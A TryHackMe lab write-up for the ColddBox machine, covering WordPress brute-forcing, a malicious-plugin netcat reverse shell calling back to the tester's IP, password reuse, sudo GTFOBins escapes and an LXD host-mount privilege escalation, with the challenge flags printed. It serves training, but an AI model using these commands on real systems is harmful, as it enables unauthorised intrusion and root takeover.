# ❄️ ColddBox: Easy

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `colddbox.thm` |
| **OS** | Ubuntu 16.04 |
| **Attack Surface** | WordPress credential brute-force, malicious plugin reverse shell |
| **Privesc** | Password reuse (`wp-config.php` → `su`) → `sudo` via `ftp`/`vim`/`chmod` + LXD container host mount |

ColddBox chains WPScan user enumeration and password brute-force against a WordPress 4.1.31 install into an authenticated reverse shell via a malicious plugin. From `www-data`, `wp-config.php` leaks database credentials that reuse directly for `su c0ldd`. That user can run `vim`, `chmod`, and `ftp` as root via `sudo` — all three are trivial GTFOBins escapes. Additionally, `c0ldd`'s LXD group membership allows spinning up an Alpine container with the host filesystem bind-mounted, yielding the root flag without ever touching the `sudo` vector.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 colddbox.thm -oA colddbox-tcp-scan
sudo nmap -sU -p- -vv -T4 colddbox.thm -oA colddbox-udp-scan
```

```
PORT     STATE  SERVICE VERSION
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
4512/tcp open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
68/udp   open|filtered dhcpc
```

SSH is running on a non-standard port (`4512`). HTTP is WordPress — old version, worth scanning properly.

### WordPress Enumeration

```bash
wpscan --url http://colddbox.thm --api-token $wptoken -e u,vp,vt,dbe
```

Notable vulnerabilities flagged against WordPress 4.1.31:

```
[!] WordPress < 5.8.3 - SQL Injection via WP_Query        (CVE-2022-21661)
[!] WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query (CVE-2022-21664)
[!] WP < 6.0.2 - SQLi via Link API
[!] WP < 6.0.3 - SQLi in WP_Date_Query
[!] WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
```

None of these are immediately exploitable without credentials. The user enumeration results are more useful right now.

### WordPress User Enumeration

```
[+] philip               (Author Id Brute Forcing — aggressive)
[+] c0ldd                (Author Id Brute Forcing — aggressive)
[+] hugo                 (Author Id Brute Forcing — aggressive)
```

Three accounts to brute. `c0ldd` looks like the main admin based on the username pattern.

---

## 💀 Initial Access — WPScan Brute-Force + Malicious Plugin Shell

### Credential Brute-Force

```bash
wpscan --url http://colddbox.thm \
  -U philip,c0ldd,hugo \
  -P ./Pwdb_top-100000.txt \
  --api-token $wptoken
```

```
[SUCCESS] - c0ldd / 9876543210

[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210
```

### Reverse Shell via Malicious Plugin

With admin credentials in hand, a malicious WordPress plugin is the cleanest path to code execution. Used [reversePress](https://github.com/MachadoOtto/reversePress/blob/main/reversePress.py) — a tool that packages a reverse shell payload into a valid WordPress plugin, uploads it via the admin panel, and triggers it automatically.

The default payload was swapped out for a `mkfifo` netcat reverse shell generated on [revshells.com](https://www.revshells.com/), which was more reliable in this environment:

```bash
# payload used (nc mkfifo — from revshells.com)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.240.231 4444 >/tmp/f
```

```bash
python3 reversePress.py 192.168.240.231 \
  -p 4444 \
  -t http://colddbox.thm \
  -U c0ldd \
  -P 9876543210 \
  -l
```

```bash
# listener
nc -nlvp 4444
```

```
connect to [192.168.240.231] from (UNKNOWN) [10.49.177.201] 44806
bash: cannot set terminal process group (1307): Inappropriate ioctl for device
bash: no job control in this shell
</www/html/wp-content/plugins/reverse_shell_plugin$
```

Shell landed as `www-data` inside the plugin directory.

### Shell Stabilisation

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# ctrl+z
stty raw -echo; fg
stty rows 44 cols 112
export TERM=xterm
```

---

## 🔁 Privilege Escalation — www-data → c0ldd

### wp-config.php Credential Leak

Standard post-shell recon on a WordPress install — check `wp-config.php`:

```bash
cat /var/www/html/wp-config.php
```

```php
define('DB_NAME',     'colddbox');
define('DB_USER',     'c0ldd');
define('DB_PASSWORD', 'cybersecurity');
define('DB_HOST',     'localhost');
```

### Database Dump (bonus recon)

```bash
mysql -u c0ldd -pcybersecurity colddbox
```

```sql
SELECT user_login, user_pass, user_nicename FROM wp_users;
```

```
+------------+------------------------------------+---------------+
| user_login | user_pass                          | user_nicename |
+------------+------------------------------------+---------------+
| c0ldd      | $P$BJs9aAEh2WaBXC2zFhhoBrDUmN1g0i1 | c0ldd         |
| hugo       | $P$B2512D1ABvEkkcFZ5lLilbqYFT1plC/ | hugo          |
| philip     | $P$BXZ9bXCbA1JQuaCqOuuIiY4vyzjK/Y. | philip        |
+------------+------------------------------------+---------------+
```

WordPress phpass hashes in the DB. Not needed — the plaintext DB password already works for `su`.

### Password Reuse → su c0ldd

```bash
www-data@ColddBox-Easy:/$ su - c0ldd
Password: cybersecurity

c0ldd@ColddBox-Easy:~$
```

### User Flag

```bash
c0ldd@ColddBox-Easy:~$ cat user.txt
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
# → Felicidades, primer nivel conseguido!
```

---

## 🔁 Privilege Escalation — c0ldd → root

### sudo Enumeration

```bash
sudo -l
```

```
(root) /usr/bin/vim
(root) /bin/chmod
(root) /usr/bin/ftp
```

Three GTFOBins entries. Any one of them gets root. All three are covered below.

---

### Method 1 — sudo ftp

```bash
sudo /usr/bin/ftp
```

```
ftp> !/bin/sh

# id
uid=0(root) gid=0(root) grupos=0(root)
```

`ftp`'s interactive shell escape (`!`) runs commands as the invoking sudo context — straight to root.

---

### Method 2 — sudo chmod (SUID bash)

```bash
sudo /bin/chmod +s /bin/bash
ls -lah /bin/bash
# -rwsr-sr-x 1 root root 1014K jul 12 2019 /bin/bash

/bin/bash -p
```

```
bash-4.3# id
uid=1000(c0ldd) gid=1000(c0ldd) euid=0(root) egid=0(root)
```

Setting the SUID bit on `/bin/bash` via `sudo chmod` then invoking it with `-p` preserves the effective UID of the file owner (`root`).

---

### Method 3 — sudo vim

```bash
sudo /usr/bin/vim
```

Inside vim:

```
:!/bin/sh
```

```
bash-4.3# id
uid=1000(c0ldd) gid=1000(c0ldd) euid=0(root) egid=0(root)
```

---

### Method 4 — LXD Group Container Mount

```bash
id
# groups=1000(c0ldd),110(lxd),...
```

`c0ldd` is in the `lxd` group. This is equivalent to root — LXD can spin up a privileged container with the host filesystem mounted inside it.

The Alpine image was built on the attacker machine using [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder), then transferred to the target:

```bash
# on attacker machine
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo bash build-alpine
# produces alpine-v3.x-x86_64-<date>.tar.gz

# transfer to target
python3 -m http.server 8080
# on target:
wget http://192.168.240.231:8080/alpine-v3.x-x86_64.tar.gz
```

```bash
lxc image import alpine-v3.x-x86_64.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc hostfs disk source=/ path=/mnt recursive=true
lxc start privesc
lxc exec privesc -- /bin/sh
```

```
~ # cd /mnt/root
/mnt/root # cat root.txt
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
# → ¡Felicidades, máquina completada!
```

The host's entire filesystem is accessible from inside the container as root, with no privilege restrictions.

---

## 🗺️ Attack Chain

```
[WordPress 4.1.31 — port 80]
    WPScan user enumeration → c0ldd, hugo, philip, "the cold in person"
          │
          ▼
[WPScan Brute-Force]
    c0ldd : 9876543210
          │
          ▼
[Malicious Plugin Upload]
    reversepress.py → reverse shell → www-data
          │
          ▼
[wp-config.php]
    DB_PASSWORD: cybersecurity → password reuse → su c0ldd
          │
          ▼
[sudo -l]
    (root) /usr/bin/vim                ──► :!/bin/sh → root
    (root) /bin/chmod                  ──► chmod +s /bin/bash → bash -p → root
    (root) /usr/bin/ftp                ──► !/bin/sh → root
          │
          ▼
[LXD Group]
    privileged container + host bind mount → /mnt/root/root.txt → root
```

---

## 📌 Key Takeaways

- Weak WordPress credentials (`9876543210`) are caught by any top-100k wordlist — strong, unique passwords per account matter especially for admin roles
- `wp-config.php` is always worth reading post-shell; plaintext DB credentials sitting there are a reliable lateral movement vector when password reuse is in play
- `sudo` entries for `vim`, `ftp`, and `chmod` are instant root — all three are well-documented on GTFOBins and should never appear in a `sudoers` file in production
- LXD/LXC group membership is effectively root access; treat it identically to `sudo ALL` in any security audit
- Non-standard SSH ports (`4512`) don't add meaningful security — they'll be found by any full port scan

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning: Vulnerability Scanning | [T1595.002](https://attack.mitre.org/techniques/T1595/002) |
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Execution | Server Software Component: Web Shell | [T1505.003](https://attack.mitre.org/techniques/T1505/003) |
| Privilege Escalation | Escape to Host | [T1611](https://attack.mitre.org/techniques/T1611) |

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `wpscan` | WordPress user enumeration and credential brute-force |
| `reversePress` | Package and deploy malicious WordPress plugin reverse shell |
| `nc` | Reverse shell listener |
| `python3` | Shell stabilisation (pty.spawn) |
| `mysql` | Database dump and credential enumeration |
| `lxc` | Privileged Alpine container with host bind mount for root |

## 🚩 Flags

| Flag | Value |
| --- | --- |
| `user.txt` | `RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==` |
| `root.txt` | `wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=` |
